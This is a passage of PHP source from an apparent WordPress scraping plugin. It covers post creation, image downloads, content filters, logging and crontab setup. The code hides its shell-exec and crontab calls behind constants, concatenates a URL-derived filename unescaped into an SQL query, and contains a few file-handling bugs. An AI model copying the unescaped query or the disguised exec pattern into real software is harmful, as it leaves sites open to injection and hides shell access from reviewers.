                'post_content' => trim($post_content),
                'post_title' => trim($post_title),
                'post_status' => $post_status,
                'comment_status' => $post_comment,
                'meta_input' => $meta_input,
                'post_type' => $post_type,
                'tags_input' => $post_tags,
                'filter' => false,
                'ping_status' => 'closed',
                'post_excerpt' => $post_excerpt
			);


            $featured_image_type = $meta_vals['scrape_featured_type'][0];
            if ($featured_image_type == 'xpath' && !empty($meta_vals['scrape_featured'][0])) {
                $node = $xpath->query($meta_vals['scrape_featured'][0]);
                if ($node->length) {
                    $post_featured_img = trim($node->item(0)->nodeValue);
                    if ($is_amazon) {
                        $data_old_hires = trim($node->item(0)->parentNode->getAttribute('data-old-hires'));
                        if (!empty($data_old_hires)) {
                            $post_featured_img = preg_replace("/\._.*_/", "", $data_old_hires);
                        } else {
                            $data_a_dynamic_image = trim($node->item(0)->parentNode->getAttribute('data-a-dynamic-image'));
                            if (!empty($data_a_dynamic_image)) {
                                $post_featured_img = array_keys(json_decode($data_a_dynamic_image, true));
                                $post_featured_img = end($post_featured_img);
                            }
                        }
                    }
                    $post_featured_img = $this->create_absolute_url($post_featured_img, $url, $html_base_url);
                    $post_featured_image_url = $post_featured_img;
                } else {
                    $post_featured_image_url = null;
                }
            } else {
                if ($featured_image_type == 'feed') {
                    $post_featured_image_url = $rss_item['featured_image'];
                } else {
                    if ($featured_image_type == 'gallery') {
                        $post_featured_image_url = wp_get_attachment_url($meta_vals['scrape_featured_gallery'][0]);
                    }
                }
            }

            $scrape_featured_regex_status = $meta_vals['scrape_featured_regex_status'][0];
            if (!empty($scrape_featured_regex_status)) {
                $scrape_featured_regex_finds = unserialize($meta_vals['scrape_featured_regex_finds'][0]);
                $scrape_featured_regex_replaces = unserialize($meta_vals['scrape_featured_regex_replaces'][0]);

                if (!empty($scrape_featured_regex_finds)) {
                    $regex_combined = array_combine(
                        $scrape_featured_regex_finds,
                        $scrape_featured_regex_replaces
                    );

                    foreach ($regex_combined as $regex => $replace) {
                        $post_featured_image_url = preg_replace("/" . str_replace("/", "\/", $regex) . "/isu", $replace, $post_featured_image_url);
                        $this->write_log("featured image url after regex:" . $post_featured_image_url);
                    }
                }
			}
			
            $scrape_featured_template_status = $meta_vals['scrape_featured_template_status'][0];
            if (!empty($scrape_featured_template_status)) {
                $template_value = $meta_vals['scrape_featured_template'][0];
                $post_featured_image_url = str_replace("[scrape_value]", $post_featured_image_url, $template_value);
                $post_featured_image_url = str_replace("[scrape_date]", $post_date, $post_featured_image_url);
                $post_featured_image_url = str_replace("[scrape_url]", $url, $post_featured_image_url);

                preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $post_featured_image_url, $matches);

                $full_matches = $matches[0];
                $name_matches = $matches[1];
                if (!empty($full_matches)) {
                    $combined = array_combine($name_matches, $full_matches);

                    foreach ($combined as $meta_name => $template_string) {
                        $val = $meta_input[$meta_name];
                        $post_featured_image_url = str_replace($template_string, $val, $post_featured_image_url);
                    }
                }
            }


            $scrape_filters_fields = $meta_vals['scrape_filters_fields'][0];

            if ($scrape_filters_fields != '') {

                $scrape_filters_fields = unserialize($meta_vals['scrape_filters_fields'][0]);
                $scrape_filters_operators = unserialize($meta_vals['scrape_filters_operators'][0]);
                $scrape_filters_values = unserialize($meta_vals['scrape_filters_values'][0]);

                for ($i = 0; $i < count($scrape_filters_fields); $i++) {

                    $field = $scrape_filters_fields[$i];
                    $operator = $scrape_filters_operators[$i];
                    $value = $scrape_filters_values[$i];


                    if ($field == 'title') {
                        $actual_value = $post_arr['post_title'];
                    } else if ($field == 'content') {
                        $actual_value = $post_arr['post_content'];
                    } else if ($field == 'excerpt') {
                        $actual_value = $post_arr['post_excerpt'];
                    } else if ($field == 'featured_image') {
                        $actual_value = $post_featured_image_url;
                    } else if ($field == 'date') {
                        $actual_value = $post_arr['post_date'];
                    } else if (strpos($field, 'custom_field_') === 0) {
                        $exploded = explode('_', $field);
                        $exploded = end($exploded);
                        $actual_value = $post_arr['meta_input'][$scrape_custom_fields[$exploded]['name']];
                    }

                    if ($operator == 'not_exists') {
                        if (is_null($actual_value)) {
                            $this->write_log('post filter applied: ' . var_export($actual_value, true) . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }

                    if ($operator == 'exists') {
                        if (!is_null($actual_value)) {
                            $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }
                    if ($operator == 'does_not_contain') {
                        if (is_string($actual_value)) {
                            if (stripos($actual_value, $value) === false) {
                                $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                                return;
                            }
                        } else if (is_array($actual_value)) {
                            if (!in_array($value, $actual_value)) {
                                $this->write_log('post filter applied: ' . var_export($actual_value, true) . ' operator : ' . $operator . ' ' . $value, 'warning');
                                return;
                            }
                        }
                    }

                    if ($operator == 'not_equal_to') {
                        if ($actual_value != $value) {
                            $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }

                    if ($operator == 'contains') {
                        if (is_string($actual_value)) {
                            if (stripos($actual_value, $value) !== false) {
                                $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                                return;
                            }
                        } else if (is_array($actual_value)) {
                            if (in_array($value, $actual_value)) {
                                $this->write_log('post filter applied: ' . var_export($actual_value, true) . ' operator : ' . $operator . ' ' . $value, 'warning');
                                return;
                            }
                        }
                    }

                    if ($operator == 'equal_to') {
                        if ($actual_value == $value) {
                            $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }

                    if ($operator == 'less_than') {
                        if ($actual_value < $value) {
                            $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }

                    if ($operator == 'greater_than') {
                        if ($actual_value > $value) {
                            $this->write_log('post filter applied: ' . $actual_value . ' operator : ' . $operator . ' ' . $value, 'warning');
                            return;
                        }
                    }
                }
            }
			
			$post_category = array_map('intval', $post_category);
			update_post_category(array(
				'ID' => $ID, 'post_category' => $post_category
			));
			
			if (is_wp_error($new_id)) {
				$this->write_log("error occurred in wordpress post entry: " . $new_id->get_error_message() . " " . $new_id->get_error_code(), true);
				return;
			}
			update_post_meta($new_id, '_scrape_task_id', $meta_vals['scrape_task_id'][0]);
			
			update_post_meta($new_id, '_scrape_original_url', $url);
			update_post_meta($new_id, '_scrape_original_html_content', $original_html_content);
			
			$cmd = $ID ? "updated" : "inserted";
			$this->write_log("post $cmd with id: " . $new_id);
			
			
			$tax_term_array = array();
			foreach ($post_category as $cat_id) {
				$term = get_term($cat_id);
				$term_tax = $term->taxonomy;
				$tax_term_array[$term_tax][] = $cat_id;
			}
			foreach ($tax_term_array as $tax => $terms) {
				wp_set_object_terms($new_id, $terms, $tax);
			}
			

			if ($featured_image_type == 'xpath' && !empty($meta_vals['scrape_featured'][0])) {
			    if(!is_null($post_featured_image_url)) {
					$this->generate_featured_image($post_featured_image_url, $new_id);
				} else {
					$this->write_log("URL: " . $url . " XPath: " . $meta_vals['scrape_featured'][0] . " returned empty for thumbnail image", true);
				}
			} else {
				if ($featured_image_type == 'feed') {
					$this->generate_featured_image($rss_item['featured_image'], $new_id);
				} else {
					if ($featured_image_type == 'gallery') {
						set_post_thumbnail($new_id, $meta_vals['scrape_featured_gallery'][0]);
					}
				}
			}
			
			if (array_key_exists('_product_image_gallery', $meta_input) && $post_type == 'product' && $woo_active) {
				$this->write_log('image gallery process starts for WooCommerce');
				$woo_img_xpath = $post_meta_values[array_search('_product_image_gallery', $post_meta_names)];
				$woo_img_xpath = $woo_img_xpath . "//img | " . $woo_img_xpath . "//a | " . $woo_img_xpath . "//div |" . $woo_img_xpath . "//li";
				$nodes = $xpath->query($woo_img_xpath);
				$this->write_log("Gallery images length is " . $nodes->length);
				
				$max_width = 0;
				$max_height = 0;
				$gallery_images = array();
				$product_gallery_ids = array();
				foreach ($nodes as $img) {
					$post_meta_index = array_search('_product_image_gallery', $post_meta_names);
					$attr = $post_meta_attributes[$post_meta_index];
					if (empty($attr)) {
						if ($img->nodeName == "img") {
							$attr = 'src';
						} else {
							$attr = 'href';
						}
					}
					$img_url = trim($img->getAttribute($attr));
					if (!empty($post_meta_regex_statuses[$post_meta_index])) {
						$regex_combined = array_combine($post_meta_regex_finds[$post_meta_index], $post_meta_regex_replaces[$post_meta_index]);
						foreach ($regex_combined as $find => $replace) {
							$this->write_log("custom field value before regex $img_url");
							$img_url = preg_replace("/" . str_replace("/", "\/", $find) . "/isu", $replace, $img_url);
							$this->write_log("custom field value after regex $img_url");
						}
					}
					$img_abs_url = $this->create_absolute_url($img_url, $url, $html_base_url);
					$this->write_log($img_abs_url);
					$is_base64 = false;
					if (substr($img_abs_url, 0, 11) == 'data:image/') {
						$array_result = getimagesizefromstring(base64_decode(substr($img_abs_url, strpos($img_abs_url, 'base64') + 7)));
						$is_base64 = true;
					} else {
						
						$args = $this->return_html_args($meta_vals);
						
						$image_req = wp_remote_get($img_abs_url, $args);
						if (is_wp_error($image_req)) {
							$this->write_log("http error in " . $img_abs_url . " " . $image_req->get_error_message(), true);
							$array_result = false;
						} else {
							$array_result = getimagesizefromstring($image_req['body']);
						}
						
					}
					if ($array_result !== false) {
						$width = $array_result[0];
						$height = $array_result[1];
						if ($width > $max_width) {
							$max_width = $width;
						}
						if ($height > $max_height) {
							$max_height = $height;
						}
						
						$gallery_images[] = array(
							'width' => $width, 'height' => $height, 'url' => $img_abs_url, 'is_base64' => $is_base64
						);
					} else {
						$this->write_log("Image size data could not be retrieved", true);
					}
				}
				
				$this->write_log("Max width found: " . $max_width . " Max height found: " . $max_height);
				foreach ($gallery_images as $gi) {
					if ($gi['is_base64']) {
						continue;
					}
					$old_url = $gi['url'];
					$width = $gi['width'];
					$height = $gi['height'];
					
					$offset = 0;
					$width_pos = array();
					
					while (strpos($old_url, strval($width), $offset) !== false) {
						$width_pos[] = strpos($old_url, strval($width), $offset);
						$offset = strpos($old_url, strval($width), $offset) + 1;
					}
					
					$offset = 0;
					$height_pos = array();
					
					while (strpos($old_url, strval($height), $offset) !== false) {
						$height_pos[] = strpos($old_url, strval($height), $offset);
						$offset = strpos($old_url, strval($height), $offset) + 1;
					}
					
					$min_distance = PHP_INT_MAX;
					$width_replace_pos = 0;
					$height_replace_pos = 0;
					foreach ($width_pos as $wr) {
						foreach ($height_pos as $hr) {
							$distance = abs($wr - $hr);
							if ($distance < $min_distance && $distance != 0) {
								$min_distance = $distance;
								$width_replace_pos = $wr;
								$height_replace_pos = $hr;
							}
						}
					}
					$min_pos = min($width_replace_pos, $height_replace_pos);
					$max_pos = max($width_replace_pos, $height_replace_pos);
					
					$new_url = "";
					
					if ($min_pos != $max_pos) {
						$this->write_log("Different pos found not square");
						$new_url = substr($old_url, 0, $min_pos) . strval($max_width) . substr($old_url, $min_pos + strlen($width), $max_pos - ($min_pos + strlen($width))) . strval($max_height) . substr($old_url, $max_pos + strlen($height));
					} else {
						if ($min_distance == PHP_INT_MAX && strpos($old_url, strval($width)) !== false) {
							$this->write_log("Same pos found square image");
							$new_url = substr($old_url, 0, strpos($old_url, strval($width))) . strval(max($max_width, $max_height)) . substr($old_url, strpos($old_url, strval($width)) + strlen($width));
						}
					}
					
					$this->write_log("Old gallery image url: " . $old_url);
					$this->write_log("New gallery image url: " . $new_url);
					if ($is_amazon) {
						$new_url = preg_replace("/\._.*_/", "", $old_url);
					}
					
					$pgi_id = $this->generate_featured_image($new_url, $new_id, false);
					if (!empty($pgi_id)) {
						$product_gallery_ids[] = $pgi_id;
					} else {
						$pgi_id = $this->generate_featured_image($old_url, $new_id, false);
						if (!empty($pgi_id)) {
							$product_gallery_ids[] = $pgi_id;
						}
					}
				}
				update_post_meta($new_id, '_product_image_gallery', implode(",", array_unique($product_gallery_ids)));
			}
			
			
			if (!empty($meta_vals['scrape_download_images'][0])) {
				if (!empty($meta_vals['scrape_allowhtml'][0])) {
					$new_html = $this->download_images_from_html_string($post_arr['post_content'], $new_id);
					kses_remove_filters();
					$new_id = wp_update_post(array(
						'ID' => $new_id, 'post_content' => $new_html
					));
					kses_init_filters();
				} else {
					$temp_str = $this->convert_html_links($original_html_content, $url, $html_base_url);
					$this->download_images_from_html_string($temp_str, $new_id);
				}
			}
			
			if (!empty($meta_vals['scrape_template_status'][0])) {
				$post = get_post($new_id);
				$post_metas = get_post_meta($new_id);
				
				$template = $meta_vals['scrape_template'][0];
				$template = str_replace(array(
					"[scrape_title]", "[scrape_content]", "[scrape_date]", "[scrape_url]", "[scrape_gallery]", "[scrape_categories]", "[scrape_tags]", "[scrape_thumbnail]"
				), array(
					$post->post_title, $post->post_content, $post->post_date, $post_metas['_scrape_original_url'][0], "[gallery]", implode(", ", wp_get_post_terms($new_id, array_diff(get_post_taxonomies($new_id), array('post_tag', 'post_format')), array('fields' => 'names'))), implode(", ", wp_get_post_tags($new_id, array('fields' => 'names'))), get_the_post_thumbnail($new_id)
				), $template);
				
				preg_match_all('/\[scrape_meta name="([^"]*)"\]/', $template, $matches);
				
				$full_matches = $matches[0];
				$name_matches = $matches[1];
				if (!empty($full_matches)) {
					$combined = array_combine($name_matches, $full_matches);
					
					foreach ($combined as $meta_name => $template_string) {
						$val = get_post_meta($new_id, $meta_name, true);
						$template = str_replace($template_string, $val, $template);
					}
				}
				
				kses_remove_filters();
				wp_update_post(array(
					'ID' => $new_id, 'post_content' => $template
				));
				kses_init_filters();
			}
			
			unset($doc);
			unset($xpath);
			unset($response);
		} else {
			$this->write_log($url . " http error in single scrape. error message " . $response->get_error_message(), true);
		}
	}
	
	public static function clear_all_schedules() {
		$all_tasks = get_posts(array(
			'numberposts' => -1, 'post_type' => 'scrape', 'post_status' => 'any'
		));
		
		foreach ($all_tasks as $task) {
			$post_id = $task->ID;
			$timestamp = wp_next_scheduled("scrape_event", array($post_id));
			wp_unschedule_event($timestamp, "scrape_event", array($post_id));
			wp_clear_scheduled_hook("scrape_event", array($post_id));
			
			wp_update_post(array(
				'ID' => $post_id, 'post_date_gmt' => date("Y-m-d H:i:s")
			));
		}
		
		if (self::check_exec_works()) {
			$e_word = E_WORD;
			$c_word = C_WORD;
			$e_word($c_word . ' -l', $output, $return);
			$command_string = '* * * * * wget -q -O - ' . site_url() . ' >/dev/null 2>&1' . PHP_EOL;
			if (!$return) {
				foreach ($output as $key => $line) {
					if ($line == $command_string) {
						unset($output[$key]);
					}
				}
			}
			$output = implode(PHP_EOL, $output);
			$cron_file = OL_PLUGIN_PATH . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . "scrape_cron_file.txt";
			file_put_contents($cron_file, $output);
			$e_word($c_word . " " . $cron_file);
		}
	}
	
	public static function create_system_cron($post_id) {
		if (!self::check_exec_works()) {
			set_transient("scrape_msg", array(__("Your " . S_WORD . " does not allow php " . E_WORD . " function. Your cron type is saved as WordPress cron type.", "ol-scrapes")));
			self::write_log("cron error: " . E_WORD . " is disabled in " . S_WORD . ".", true);
			update_post_meta($post_id, 'scrape_cron_type', 'wordpress');
			return;
		}
		
		$cron_file = OL_PLUGIN_PATH . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . "scrape_cron_file.txt";
		touch($cron_file);
		chmod($cron_file, 0755);
		$command_string = '* * * * * wget -q -O - ' . site_url() . ' >/dev/null 2>&1';
		$e_word = E_WORD;
		$c_word = C_WORD;
		$e_word($c_word . ' -l', $output, $return);
		$output = implode(PHP_EOL, $output);
		self::write_log($c_word . " -l result ");
		self::write_log($output);
		if (!$return) {
			if (strpos($output, $command_string) === false) {
				$command_string = $output . PHP_EOL . $command_string . PHP_EOL;
				
				file_put_contents($cron_file, $command_string);
				
				$command = $c_word . ' ' . $cron_file;
				$output = $return = null;
				$e_word($command, $output, $return);
				
				self::write_log($output);
				if ($return) {
					set_transient("scrape_msg", array(__(S_WORD . " error occurred during " . C_WORD . " installation. Your cron type is saved as WordPress cron type.", "ol-scrapes")));
					update_post_meta($post_id, 'scrape_cron_type', 'wordpress');
				}
			}
		} else {
			set_transient("scrape_msg", array(__(S_WORD . " error occurred while getting your cron jobs. Your cron type is saved as WordPress cron type.", "ol-scrapes")));
			update_post_meta($post_id, 'scrape_cron_type', 'wordpress');
		}
	}
	
	public static function clear_all_tasks() {
		$all_tasks = get_posts(array(
			'numberposts' => -1, 'post_type' => 'scrape', 'post_status' => 'any'
		));
		
		foreach ($all_tasks as $task) {
			$meta_vals = get_post_meta($task->ID);
			foreach ($meta_vals as $key => $value) {
				delete_post_meta($task->ID, $key);
			}
			wp_delete_post($task->ID, true);
		}
	}
	
	public static function clear_all_values() {
		delete_site_option("ol_scrapes_valid");
		delete_site_option("ol_scrapes_domain");
		delete_site_option("ol_scrapes_pc");
		
		delete_site_option("scrape_plugin_activation_error");
		delete_site_option("scrape_user_agent");
		
		delete_transient("scrape_msg");
		delete_transient("scrape_msg_req");
		delete_transient("scrape_msg_set");
		delete_transient("scrape_msg_set_success");
	}
	
	public function check_warnings() {
		$message = "";
		if (defined("DISABLE_WP_CRON") && DISABLE_WP_CRON) {
			$message .= __("DISABLE_WP_CRON is probably set true in wp-config.php.<br/>Please delete or set it to false, or make sure that you ping wp-cron.php automatically.", "ol-scrapes");
		}
		if (!empty($message)) {
			set_transient("scrape_msg", array($message));
		}
	}
	
	public function detect_html_encoding_and_replace($header, &$body, $ajax = false) {
		global $charset_header, $charset_php, $charset_meta;

		if ($ajax) {
			wp_ajax_url($ajax);
		}
		
		$charset_regex = preg_match("/<meta(?!\s*(?:name|value)\s*=)(?:[^>]*?content\s*=[\s\"']*)?([^>]*?)[\s\"';]*charset\s*=[\s\"']*([^\s\"'\/>]*)[\s\"']*\/?>/i", $body, $matches);
		if (empty($header)) {
			$charset_header = false;
		} else {
			$charset_header = explode(";", $header);
			if (count($charset_header) == 2) {
				$charset_header = $charset_header[1];
				$charset_header = explode("=", $charset_header);
				$charset_header = strtolower(trim(trim($charset_header[1]), "\"''"));
				if ($charset_header == "utf8") {
					$charset_header = "utf-8";
				}
			} else {
				$charset_header = false;
			}
		}
		if ($charset_regex) {
			$charset_meta = strtolower($matches[2]);
			if ($charset_meta == "utf8") {
				$charset_meta = "utf-8";
			}
			if ($charset_meta != "utf-8") {
				$body = str_replace($matches[0], "<meta charset='utf-8'>", $body);
			}
		} else {
			$charset_meta = false;
		}
		
		$charset_php = strtolower(mb_detect_encoding($body, mb_list_encodings(), false));

		return detect_html_charset(array(
			'default' => 'utf-8', 'header' => $charset_header, 'meta' => $charset_meta
		));
	}
	
	public function detect_feed_encoding_and_replace($header, &$body, $ajax = false) {
		global $charset_header, $charset_php, $charset_xml;

		if ($ajax) {
			wp_ajax_url($ajax);
		}
		
		$encoding_regex = preg_match("/encoding\s*=\s*[\"']([^\"']*)\s*[\"']/isu", $body, $matches);
		if (empty($header)) {
			$charset_header = false;
		} else {
			$charset_header = explode(";", $header);
			if (count($charset_header) == 2) {
				$charset_header = $charset_header[1];
				$charset_header = explode("=", $charset_header);
				$charset_header = strtolower(trim(trim($charset_header[1]), "\"''"));
			} else {
				$charset_header = false;
			}
		}
		if ($encoding_regex) {
			$charset_xml = strtolower($matches[1]);
			if ($charset_xml != "utf-8") {
				$body = str_replace($matches[1], 'utf-8', $body);
			}
		} else {
			$charset_xml = false;
		}
		
		$charset_php = strtolower(mb_detect_encoding($body, mb_list_encodings(), false));

		return detect_xml_charset(array(
			'default' => 'utf-8', 'header' => $charset_header, 'meta' => $charset_xml
		));
	}
	
	public function add_attachment_from_url($attachment_url, $post_id) {
		$this->write_log($attachment_url . " attachment controls");
		$meta_vals = get_post_meta(self::$task_id);
		$upload_dir = wp_upload_dir();
		
		$parsed = parse_url($attachment_url);
		$filename = basename($parsed['path']);
		
		global $wpdb;
		$query = "SELECT ID FROM {$wpdb->posts} WHERE post_title LIKE '" . $filename . "%' and post_type ='attachment' and post_parent = $post_id";
		$attachment_id = $wpdb->get_var($query);
		
		$this->write_log("found attachment id for $post_id : " . $attachment_id);
		
		if (empty($attachment_id)) {
			if (wp_mkdir_p($upload_dir['path'])) {
				$file = $upload_dir['path'] . '/' . $filename;
			} else {
				$file = $upload_dir['basedir'] . '/' . $filename;
			}
			
			$args = $this->return_html_args($meta_vals);
			
			$file_data = wp_remote_get($attachment_url, $args);
			if (is_wp_error($file_data)) {
				$this->write_log("http error in " . $attachment_url . " " . $file_data->get_error_message(), true);
				return;
			}
			
			
			$mimetype = wp_check_filetype($filename);
			if ($mimetype === false) {
				$this->write_log("mime type of image can not be found");
				return;
			}
			
			$mimetype = $mimetype['type'];
			$extension = $mimetype['ext'];
			
			file_put_contents($filename, $file_data['body']);
			
			$attachment = array(
				'post_mime_type' => $mimetype, 'post_title' => $filename . ".$extension", 'post_content' => '', 'post_status' => 'inherit'
			);
			
			$attach_id = wp_insert_attachment($attachment, $file, $post_id);
			
			$this->write_log("attachment id : " . $attach_id . " mime type: " . $mimetype . " added to media library.");
			
			require_once(ABSPATH . 'wp-admin/includes/image.php');
			$attach_data = wp_generate_attachment_metadata($attach_id, $file);
			wp_update_attachment_metadata($attach_id, $attach_data);
			return $attach_id;
		}
		return $attachment_id;
	}
	
	public function generate_featured_image($image_url, $post_id, $featured = true) {
		$this->write_log($image_url . " thumbnail controls");
		$meta_vals = get_post_meta(self::$task_id);
        $parent_post_title = get_the_title($post_id);
		$upload_dir = wp_upload_dir();
		
		global $wpdb;
		$query = "SELECT ID FROM {$wpdb->posts} WHERE post_content LIKE '" . md5($image_url) . "%' and post_type ='attachment' and post_parent = $post_id";
		$image_id = $wpdb->get_var($query);
		
		$this->write_log("found image id for $post_id : " . $image_id);
		
		if (empty($image_id)) {

            $filename = sanitize_file_name(sanitize_title($parent_post_title) . '_' . uniqid());

			if (wp_mkdir_p($upload_dir['path'])) {
				$file = $upload_dir['path'] . '/' . $filename;
			} else {
				$file = $upload_dir['basedir'] . '/' . $filename;
			}
			
			if (substr($image_url, 0, 11) == 'data:image/') {
				$image_data = array(
					'body' => base64_decode(substr($image_url, strpos($image_url, 'base64') + 7))
				);
			} else {
				$args = $this->return_html_args($meta_vals);
				
				$image_data = wp_remote_get($image_url, $args);
				if (is_wp_error($image_data)) {
					$this->write_log("http error in " . $image_url . " " . $image_data->get_error_message(), true);
					return;
				}
			}
			
			$mimetype = getimagesizefromstring($image_data['body']);
			if ($mimetype === false) {
				$this->write_log("mime type of image can not be found");
				$this->write_log(substr($image_data['body'], 0, 150));
				return;
			}
			
			$mimetype = $mimetype["mime"];
			$extension = substr($mimetype, strpos($mimetype, "/") + 1);
			$file .= ".$extension";
			
			file_put_contents($file, $image_data['body']);
			
			$attachment = array(
				'post_mime_type' => $mimetype,
                'post_title' => $parent_post_title . '_' . uniqid() . '.' . $extension,
                'post_content' => md5($image_url),
                'post_status' => 'inherit'
			);
			
			$attach_id = wp_insert_attachment($attachment, $file, $post_id);
			
			$this->write_log("attachment id : " . $attach_id . " mime type: " . $mimetype . " added to media library.");
			
			require_once(ABSPATH . 'wp-admin/includes/image.php');
			$attach_data = wp_generate_attachment_metadata($attach_id, $file);
			wp_update_attachment_metadata($attach_id, $attach_data);
			if ($featured) {
				set_post_thumbnail($post_id, $attach_id);
			}
			
			unset($attach_data);
			unset($image_data);
			unset($mimetype);
			return $attach_id;
		} else {
			if ($featured) {
				$this->write_log("image already exists set thumbnail for post " . $post_id . " to " . $image_id);
				set_post_thumbnail($post_id, $image_id);
			}
		}
		return $image_id;
	}
	
	public function create_absolute_url($rel, $base, $html_base) {
		$rel = trim($rel);
		$base = strtolower(trim($base));
		if (substr($rel, 0, 11) == 'data:image/') {
			return $rel;
		}
		if ($rel[0] == '#') { 
			return $rel; 
		}
		if (!empty($html_base)) {
			$base = $html_base;
		}
		return str_replace(" ", "%20", WP_Http::make_absolute_url($rel, $base));
	}
	
	public static function write_log($message, $is_error = false) {
		$folder = plugin_dir_path(__FILE__) . "../logs";
		$handle = fopen($folder . DIRECTORY_SEPARATOR . "logs.txt", "a");
		if (!is_string($message)) {
			$message = print_r($message, true);
		}
		if ($is_error) {
			$message = PHP_EOL . " === Scrapes Warning === " . PHP_EOL . $message . PHP_EOL . " === Scrapes Warning === ";
		}
		fwrite($handle, current_time('mysql') . " TASK ID: " . self::$task_id . " - PID: " . getmypid() . " - RAM: " . (round(memory_get_usage() / (1024 * 1024), 2)) . "MB - " . get_current_blog_id() . " " . $message . PHP_EOL);
		if ((filesize($folder . DIRECTORY_SEPARATOR . "logs.txt") / 1024 / 1024) >= 10) {
			fclose($handle);
			unlink($folder . DIRECTORY_SEPARATOR . "logs.txt");
			$handle = fopen($folder . DIRECTORY_SEPARATOR . "logs.txt", "a");
			fwrite($handle, current_time('mysql') . " - " . getmypid() . " - " . self::system_info() . PHP_EOL);
		}
		fclose($handle);
	}
	
	public static function system_info() {
		global $wpdb;
		
		if (!function_exists('get_plugins')) {
			require_once ABSPATH . 'wp-admin/includes/plugin.php';
		}
		
		$system_info = "";
		$system_info .= "Website Name: " . get_bloginfo() . PHP_EOL;
		$system_info .= "Wordpress URL: " . site_url() . PHP_EOL;
		$system_info .= "Site URL: " . home_url() . PHP_EOL;
		$system_info .= "Wordpress Version: " . get_bloginfo('version') . PHP_EOL;
		$system_info .= "Multisite: " . (is_multisite() ? "yes" : "no") . PHP_EOL;
		$system_info .= "Theme: " . wp_get_theme() . PHP_EOL;
		$system_info .= "PHP Version: " . phpversion() . PHP_EOL;
		$system_info .= "PHP Extensions: " . json_encode(get_loaded_extensions()) . PHP_EOL;
		$system_info .= "MySQL Version: " . $wpdb->db_version() . PHP_EOL;
		$system_info .= "Server Info: " . $_SERVER['SERVER_SOFTWARE'] . PHP_EOL;
		$system_info .= "WP Memory Limit: " . WP_MEMORY_LIMIT . PHP_EOL;
		$system_info .= "WP Admin Memory Limit: " . WP_MAX_MEMORY_LIMIT . PHP_EOL;
		$system_info .= "PHP Memory Limit: " . ini_get('memory_limit') . PHP_EOL;
		$system_info .= "Wordpress Plugins: " . json_encode(get_plugins()) . PHP_EOL;
		$system_info .= "Wordpress Active Plugins: " . json_encode(get_option('active_plugins')) . PHP_EOL;
		return $system_info;
	}
	
	public static function disable_plugin() {
		if (current_user_can('activate_plugins') && is_plugin_active(plugin_basename(OL_PLUGIN_PATH . 'ol_scrapes.php'))) {
			deactivate_plugins(plugin_basename(OL_PLUGIN_PATH . 'ol_scrapes.php'));
			if (isset($_GET['activate'])) {
				unset($_GET['activate']);
			}
		}
	}
	
	public static function show_notice() {
		load_plugin_textdomain('ol-scrapes', false, dirname(plugin_basename(__FILE__)) . '/../languages');
		$msgs = get_transient("scrape_msg");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
                <div class="notice notice-error">
                    <p><strong>Scrapes: </strong><?php echo $msg; ?> <a
                                href="<?php echo add_query_arg('post_type', 'scrape', admin_url('edit.php')); ?>"><?php _e("View All Scrapes", "ol-scrapes"); ?></a>.
                    </p>
                </div>
				<?php
			endforeach;
		endif;
		
		$msgs = get_transient("scrape_msg_req");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
                <div class="notice notice-error">
                    <p><strong>Scrapes: </strong><?php echo $msg; ?></p>
                </div>
				<?php
			endforeach;
		endif;
		
		$msgs = get_transient("scrape_msg_set");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
                <div class="notice notice-error">
                    <p><strong>Scrapes: </strong><?php echo $msg; ?></p>
                </div>
				<?php
			endforeach;
		endif;
		
		$msgs = get_transient("scrape_msg_set_success");
		if (!empty($msgs)) :
			foreach ($msgs as $msg) :
				?>
                <div class="notice notice-success">
                    <p><strong>Scrapes: </strong><?php echo $msg; ?></p>
                </div>
				<?php
			endforeach;
		endif;
		
		delete_transient("scrape_msg");
		delete_transient("scrape_msg_req");
		delete_transient("scrape_msg_set");
		delete_transient("scrape_msg_set_success");
	}
	
	public function custom_column() {
		add_filter('manage_' . 'scrape' . '_posts_columns', array($this, 'add_status_column'));
		add_action('manage_' . 'scrape' . '_posts_custom_column', array($this, 'show_status_column'), 10, 2);
		add_filter('post_row_actions', array($this, 'remove_row_actions'), 10, 2);
		add_filter('manage_' . 'edit-scrape' . '_sortable_columns', array($this, 'add_sortable_column'));
	}
	
	public function add_sortable_column() {
		return array(
			'name' => 'title'
		);
	}
	
	public function custom_start_stop_action() {
		add_action('load-edit.php', array($this, 'scrape_custom_actions'));
	}
	
	public function scrape_custom_actions() {
		$nonce = isset($_REQUEST['_wpnonce']) ? $_REQUEST['_wpnonce'] : null;
		$action = isset($_REQUEST['scrape_action']) ? $_REQUEST['scrape_action'] : null;
		$post_id = isset($_REQUEST['scrape_id']) ? intval($_REQUEST['scrape_id']) : null;
		if (wp_verify_nonce($nonce, 'scrape_custom_action') && isset($post_id)) {
			
			if ($action == 'stop_scrape') {
				$my_post = array();
				$my_post['ID'] = $post_id;
				$my_post['post_date_gmt'] = date("Y-m-d H:i:s");
				wp_update_post($my_post);
				$this->write_log($post_id . " stop button clicked."); 
			} else {
				if ($action == 'start_scrape') {
					update_post_meta($post_id, 'scrape_workstatus', 'waiting');
					update_post_meta($post_id, 'scrape_run_count', 0);
					update_post_meta($post_id, 'scrape_start_time', '');
					update_post_meta($post_id, 'scrape_end_time', '');
					update_post_meta($post_id, 'scrape_last_scrape', '');
					update_post_meta($post_id, 'scrape_task_id', $post_id);
					$this->handle_cron_job($_REQUEST['scrape_id']);
					$this->write_log($post_id . " start button clicked."); 
				} else {
					if ($action == 'duplicate_scrape') {
						$post = get_post($post_id, ARRAY_A);
						$post['ID'] = 0;
						$insert_id = wp_insert_post($post);
